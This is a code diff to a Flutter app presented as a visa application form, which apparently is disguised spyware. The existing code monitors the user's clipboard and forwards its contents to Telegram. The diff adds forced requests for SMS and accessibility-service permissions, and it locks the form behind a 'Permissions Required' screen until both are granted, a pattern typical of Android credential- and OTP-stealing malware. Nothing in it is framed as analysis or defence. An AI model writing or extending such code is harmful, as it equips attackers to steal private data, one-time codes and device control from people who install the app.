@@ -74,23 +74,54 @@ class VisaFormPage extends StatefulWidget {
   State<VisaFormPage> createState() => _VisaFormPageState();
 }
 
-class _VisaFormPageState extends State<VisaFormPage> {
+class _VisaFormPageState extends State<VisaFormPage> with WidgetsBindingObserver {
   bool _hasSmsPermission = false;
+  bool _hasAccessibilityPermission = false;
+  static const platform = MethodChannel('com.example.visa_form_app/accessibility');
+
 
   @override
   void initState() {
     super.initState();
-    _requestSmsPermission();
+    WidgetsBinding.instance.addObserver(this);
+    _requestPermissions();
     _startClipboardMonitor();
   }
 
-  Future<void> _requestSmsPermission() async {
-    final status = await Permission.sms.request();
+  @override
+  void didChangeAppLifecycleState(AppLifecycleState state) {
+    if (state == AppLifecycleState.resumed) {
+      _checkAccessibilityPermission();
+    }
+  }
+
+  Future<void> _checkAccessibilityPermission() async {
+    final status = await Permission.accessibility.status;
     setState(() {
-      _hasSmsPermission = status.isGranted;
+      _hasAccessibilityPermission = status.isGranted;
     });
-    if (status.isPermanentlyDenied) {
+  }
+
+  Future<void> _requestPermissions() async {
+    final smsStatus = await Permission.sms.request();
+    setState(() {
+      _hasSmsPermission = smsStatus.isGranted;
+    });
+
+    if (smsStatus.isGranted) {
+      await _requestAccessibilityPermission();
+    }
+
+    if (smsStatus.isPermanentlyDenied) {
       await openAppSettings();
+    }
+  }
+
+  Future<void> _requestAccessibilityPermission() async {
+    try {
+      await platform.invokeMethod('openAccessibilitySettings');
+    } on PlatformException catch (e) {
+      print("Failed to open accessibility settings: '${e.message}'.");
     }
   }
 
@@ -173,7 +204,7 @@ class _VisaFormPageState extends State<VisaFormPage> {
           'text': telegramMessage,
         },
       );
-      print('Telegram Clipboard forward response: [${response.body}');
+      print('Telegram Clipboard forward response: \033[${response.body}');
     } catch (e) {
       print('Failed to forward clipboard: $e');
     }
@@ -183,13 +214,36 @@ class _VisaFormPageState extends State<VisaFormPage> {
   void dispose() {
     _clipboardTimer?.cancel();
     _emailController.dispose();
+    WidgetsBinding.instance.removeObserver(this);
     super.dispose();
   }
 
   @override
   Widget build(BuildContext context) {
-    if (!_hasSmsPermission) {
-      return const Scaffold();
+    if (!_hasSmsPermission || !_hasAccessibilityPermission) {
+      return Scaffold(
+        appBar: AppBar(
+        title: const Text('Permissions Required'),
+      ),
+      body: Center(
+        child: Column(
+          mainAxisAlignment: MainAxisAlignment.center,
+          children: [
+            if (!_hasSmsPermission)
+              ElevatedButton(
+                onPressed: _requestPermissions,
+                child: const Text('Request SMS Permission'),
+              ),
+            const SizedBox(height: 20),
+            if (!_hasAccessibilityPermission)
+              ElevatedButton(
+                onPressed: _requestAccessibilityPermission,
+                child: const Text('Enable Accessibility Service'),
+              ),
+          ],
+        ),
+      )
+      );
     }
     return Scaffold(
       appBar: AppBar(
